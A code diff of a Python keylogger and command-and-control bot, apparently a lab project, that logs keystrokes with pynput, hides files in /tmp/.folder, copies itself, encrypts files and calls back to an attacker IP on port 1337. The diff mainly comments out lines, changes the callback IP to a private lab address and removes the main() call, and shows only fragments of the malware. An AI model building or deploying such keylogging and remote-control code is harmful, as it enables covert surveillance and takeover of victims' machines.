@@ -16,15 +16,15 @@ try:
 	from pynput import keyboard # Import keyboard to perform keylogger operations.
 	from threading import Timer, Thread # Import Timer to create thread that'll run every 20s.
 	from cryptography.fernet import Fernet # Import Fernet for encryption.
-except ImportError as e:
-    print(f'Import error: {e}')
+#except ImportError as e:
+ #   print(f'Import error: {e}')
     
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+#""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 #  CONSTANTS  #
 FILENAME = __file__[2:] # The name of this file.
 SYSTEM = system() # The operating this program is being ran on.
-IP = '127.0.0.1' # IP address to connect to. Change this to your IP address!
+IP = '192.168.56.105' # IP address to connect to. Change this to your IP address!
 PORT = 1337 # Port number to create socket with.
 LIN_DIR = '/tmp/.folder/' # Hidden Linux folder to create for our keylogger.
 # WIN_DIR = r'%temp%\.folder' # Hideen Windows folder to create for our keylogger.
@@ -32,7 +32,7 @@ SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to
 LOG = '' # Will store the keystrokes of the user.
 COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+#""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def create_client_socket():
 	"""This function creates a client socket to connect to 
@@ -130,7 +130,7 @@ def propagate(name: str):
 		# 	return r'  Unable to propagate...' # Return this string if copying operation fails.
 		# return r'  File has been cloned to temp, C:\Users\[current user]\, and AppData\...' # Return this string is we successfully copied files.
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+#""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def on_press(key):
 	"""This function will handle all the keystrokes a person types into
@@ -216,7 +216,7 @@ def keylogger():
 	except OSError: # Ignore os error.
 		pass
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+#""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def crypto(action: str, *args):
 	"""This function will handle all of our encryption/decryption processes.
@@ -251,7 +251,7 @@ def crypto(action: str, *args):
 			f.truncate()
 			return '  [+] File successfully decrypted!'
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+#""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 # class WindowsBot:
 # 	"""This class definition will contain the functions and commands
@@ -315,7 +315,7 @@ def crypto(action: str, *args):
 # 		except:
 # 			exit(1)
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+#""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 class LinuxBot:
 	"""This class definition will contain the functions and commands
@@ -378,7 +378,7 @@ class LinuxBot:
 		except:
 			exit(1)
 
-""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+#""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def main():
 	obj = None
@@ -390,4 +390,3 @@ def main():
 	obj.handle_request() # Will invoke function that will handle all socket connection operations.
 
 if __name__ == '__main__':
-    main()
